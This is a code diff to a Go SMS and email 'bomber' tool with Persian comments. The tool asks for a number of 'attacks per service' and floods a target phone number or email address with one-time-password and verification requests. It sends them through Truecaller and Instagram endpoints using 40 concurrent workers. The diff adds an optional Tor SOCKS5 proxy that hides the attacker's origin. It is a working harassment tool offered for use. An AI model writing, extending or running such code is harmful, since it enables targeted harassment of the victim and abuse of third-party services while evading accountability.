@@ -16,6 +16,8 @@ import (
 	"sync"
 	"syscall"
 	"time"
+
+	"golang.org/x/net/proxy" // <-- بخش جدید: پکیج برای استفاده از پروکسی Tor
 )
 
 var userAgents = []string{
@@ -23,7 +25,8 @@ var userAgents = []string{
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
 }
 
-// ... بقیه متغیرها و توابع کمکی مثل قبل بدون تغییر هستند ...
+// ... توابع کمکی (clearScreen, sendRequest, etc) ...
+
 func clearScreen() {
 	cmd := exec.Command("clear")
 	if runtime.GOOS == "windows" {
@@ -82,11 +85,10 @@ func parsePhoneNumber(fullNumber string) (string, string) {
 	if !strings.HasPrefix(fullNumber, "+") {
 		return "", ""
 	}
-	// مشکل ۲: تمام فاصله‌های نامرئی با فاصله‌های عادی جایگزین شدند
 	numericToAlpha := map[string]string{
 		"32": "be",
 		"98": "ir",
-		"1":  "us",
+		"1":  "us", // اصلاح شده: کاراکتر نامرئی حذف شد
 		"44": "gb",
 	}
 	for numCode, alphaCode := range numericToAlpha {
@@ -114,6 +116,37 @@ func main() {
 	fmt.Print("\033[01;32mEnter number of attacks per service: \033[00;36m")
 	fmt.Scan(&repeatCount)
 
+	// =========================================================================
+	// بخش جدید: انتخاب برای استفاده از Tor
+	// =========================================================================
+	var useTor string
+	fmt.Print("\033[01;33mDo you want to use Tor? (yes/no): \033[00;36m")
+	fmt.Scan(&useTor)
+
+	// ساخت http.Client
+	// اگر کاربر انتخاب کند، از پروکسی Tor استفاده می‌کنیم
+	client := &http.Client{Timeout: 30 * time.Second} // افزایش زمان برای شبکه Tor
+
+	if strings.ToLower(useTor) == "yes" {
+		fmt.Println("\033[01;32m[*] Configuring to use Tor proxy on 127.0.0.1:9050...")
+		
+		// آدرس پروکسی Tor
+		torProxy := "127.0.0.1:9050"
+
+		// ایجاد یک dialer که از پروکسی SOCKS5 استفاده می‌کند
+		dialer, err := proxy.SOCKS5("tcp", torProxy, nil, proxy.Direct)
+		if err != nil {
+			fmt.Println("\033[01;31m[-] Error creating Tor dialer:", err)
+			os.Exit(1)
+		}
+
+		// تنظیم transport برای http.Client
+		httpTransport := &http.Transport{
+			DialContext: dialer.(proxy.ContextDialer).DialContext,
+		}
+		client.Transport = httpTransport
+	}
+
 	numWorkers := 40
 
 	ctx, cancel := context.WithCancel(context.Background())
@@ -121,7 +154,6 @@ func main() {
 	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)
 	go func() { <-signalChan; cancel() }()
 
-	client := &http.Client{Timeout: 10 * time.Second}
 	tasks := make(chan func(), repeatCount*200)
 	ch := make(chan int, repeatCount*200)
 	var wg sync.WaitGroup
@@ -135,9 +167,23 @@ func main() {
 	}
 
 	for i := 0; i < repeatCount; i++ {
-		// --- SMS Tasks ---
 		if phone != "" {
+			// ** API 1: Truecaller (EU) **
+			wg.Add(1)
+			tasks <- func() {
+				phoneNum, countryCode := parsePhoneNumber(phone)
+				if phoneNum != "" && countryCode != "" {
+					payload := map[string]interface{}{
+						"phone":       phoneNum, // اصلاح شده: کاراکتر نامرئی حذف شد
+						"countryCode": countryCode,
+					}
+					sendJSONRequest(client, ctx, "https://europe-west1-truecaller-web.cloudfunctions.net/webapi/eu/auth/truecaller/v1/send-otp", payload, &wg, ch)
+				} else {
+					wg.Done()
+				}
+			}
 
+			// ** API 1.5: Truecaller (Non-EU) **
 			wg.Add(1)
 			tasks <- func() {
 				phoneNum, countryCode := parsePhoneNumber(phone)
@@ -150,25 +196,9 @@ func main() {
 				} else {
 					wg.Done()
 				}
-
-
-			// ** API 1: Truecaller (JSON) **
-			wg.Add(1)
-			tasks <- func() {
-				phoneNum, countryCode := parsePhoneNumber(phone)
-				if phoneNum != "" && countryCode != "" {
-					// مشکل ۲: فاصله‌های نامرئی اینجا هم اصلاح شدند
-					payload := map[string]interface{}{
-						"phone":       phoneNum,
-						"countryCode": countryCode,
-					}
-					sendJSONRequest(client, ctx, "https://europe-west1-truecaller-web.cloudfunctions.net/webapi/eu/auth/truecaller/v1/send-otp", payload, &wg, ch)
-				} else {
-					wg.Done()
-				}
 			}
 
-			// ** API 2: Instagram Check Phone (Form) **
+			// ** API 2 & 3: Instagram **
 			wg.Add(1)
 			tasks <- func() {
 				formData := url.Values{}
@@ -176,8 +206,6 @@ func main() {
 				formData.Set("jazoest", "21771")
 				sendFormRequest(client, ctx, "https://www.instagram.com/api/v1/web/accounts/check_phone_number/", formData, &wg, ch)
 			}
-			
-			// ** API 3: Instagram Send SMS (Form) **
 			wg.Add(1)
 			tasks <- func() {
 				formData := url.Values{}
@@ -188,9 +216,8 @@ func main() {
 			}
 		}
 
-		// --- Email Tasks ---
 		if email != "" {
-			// ** API 4: Instagram Check Email (Form) **
+			// ** API 4 & 5: Instagram **
 			wg.Add(1)
 			tasks <- func() {
 				formData := url.Values{}
@@ -198,8 +225,6 @@ func main() {
 				formData.Set("jazoest", "21771")
 				sendFormRequest(client, ctx, "https://www.instagram.com/api/v1/web/accounts/check_email/", formData, &wg, ch)
 			}
-
-			// ** API 5: Instagram Send Verify Email (Form) **
 			wg.Add(1)
 			tasks <- func() {
 				formData := url.Values{}
